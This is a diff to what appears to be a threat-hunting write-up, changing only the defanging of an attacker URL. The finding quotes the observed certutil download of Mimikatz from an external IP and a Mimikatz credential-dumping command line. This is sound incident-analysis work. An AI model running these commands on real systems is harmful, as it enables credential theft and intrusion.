@@ -216,7 +216,7 @@ DeviceNetworkEvents
 
 **Finding**: The attacker abused `certutil.exe` again to download the credential-harvesting tool `Mimikatz` from `http[:]//78[.]141[.]196[.]6[:]8080/` to the created file `mm.exe` at `2025-11-19T19:07:22.8551193Z`. They then used the extraction module `sekurlsa::logonpasswords` to extract logon passwords from memory at `2025-11-19T19:08:26.2804285Z`.  
 
-**Commands Used**: `certutil.exe -urlcache -f http[:]//78[.]141[.]196[.]6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe` and `"mm.exe" privilege::debug sekurlsa::logonpasswords exit`
+**Commands Used**: `certutil.exe -urlcache -f http[:]//78[.]141[.]196[.]6[:]8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe` and `"mm.exe" privilege::debug sekurlsa::logonpasswords exit`
 
 **KQL Queries**:
 ```
